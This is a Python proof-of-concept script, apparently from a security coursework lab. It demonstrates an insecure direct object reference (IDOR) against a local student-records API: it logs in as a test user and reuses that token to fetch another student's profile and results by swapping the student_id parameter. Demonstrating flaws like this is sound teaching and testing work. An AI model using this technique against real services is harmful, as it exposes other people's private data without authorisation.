"""
CW1 attack script for VULN-02.

Logs in as Bob and uses the same JWT token to retrieve Alice's profile and
results, confirming the IDOR vulnerability in the vulnerable version.
"""

from __future__ import annotations

import json

import requests

BASE_URL = "http://127.0.0.1:5000"
BOB_USERNAME = "bob"
BOB_PASSWORD = "letmein"
BOB_STUDENT_ID = "S002"
ALICE_STUDENT_ID = "S001"
SEPARATOR = "=" * 72


def heading(title: str) -> None:
    print()
    print(SEPARATOR)
    print(f"  {title}")
    print(SEPARATOR)


def pretty(data: dict) -> str:
    return json.dumps(data, indent=2, ensure_ascii=False)


def api_get(endpoint: str, token: str, student_id: str) -> requests.Response:
    return requests.get(
        f"{BASE_URL}{endpoint}",
        headers={"Authorization": f"Bearer {token}"},
        params={"student_id": student_id},
        timeout=10,
    )


def main() -> None:
    print(SEPARATOR)
    print("  CW1 VULN-02 Attack - IDOR Against Profile and Results")
    print(f"  Target : {BASE_URL}")
    print(SEPARATOR)

    heading("STEP 1 - Bob logs in")
    login = requests.post(
        f"{BASE_URL}/login",
        json={"username": BOB_USERNAME, "password": BOB_PASSWORD},
        timeout=10,
    )
    login.raise_for_status()
    login_data = login.json()
    token = login_data["token"]

    print(f"  Logged in as : {login_data['user']['username']} ({login_data['user']['student_id']})")
    print(f"  Role         : {login_data['user']['role']}")
    print(f"  Token prefix : {token[:36]}...")

    heading("STEP 2 - Bob requests his own data")
    own_profile = api_get("/profile", token, BOB_STUDENT_ID)
    print(f"\nGET /profile?student_id={BOB_STUDENT_ID} -> {own_profile.status_code}")
    print(pretty(own_profile.json()))

    own_results = api_get("/results", token, BOB_STUDENT_ID)
    print(f"\nGET /results?student_id={BOB_STUDENT_ID} -> {own_results.status_code}")
    print(pretty(own_results.json()))

    heading("STEP 3 - Bob requests Alice's data with the same token")
    other_profile = api_get("/profile", token, ALICE_STUDENT_ID)
    print(f"\nGET /profile?student_id={ALICE_STUDENT_ID} -> {other_profile.status_code}")
    print(pretty(other_profile.json()))

    other_results = api_get("/results", token, ALICE_STUDENT_ID)
    print(f"\nGET /results?student_id={ALICE_STUDENT_ID} -> {other_results.status_code}")
    print(pretty(other_results.json()))

    heading("SUMMARY")
    print("  Bob -> own profile/results   : 200")
    print("  Bob -> Alice profile/results : 200")
    print("  This confirms the CW1 IDOR vulnerability.")


if __name__ == "__main__":
    main()
